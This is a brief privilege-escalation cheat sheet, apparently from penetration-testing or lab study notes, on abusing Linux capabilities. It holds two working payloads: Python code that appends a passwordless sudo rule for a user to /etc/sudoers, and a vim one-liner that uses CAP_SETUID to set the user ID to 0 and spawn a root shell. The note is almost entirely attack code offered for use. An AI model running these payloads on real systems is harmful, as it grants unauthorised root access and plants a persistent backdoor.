# capabilites
for cap overwrite

```text-plain
file = open("/etc/sudoers","a")
file.write("student ALL=(ALL) NOPASSWD:ALL")
file.close()
```

for `CAP_SETUID` on vim, we can use the following payload:  

```text-plain
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```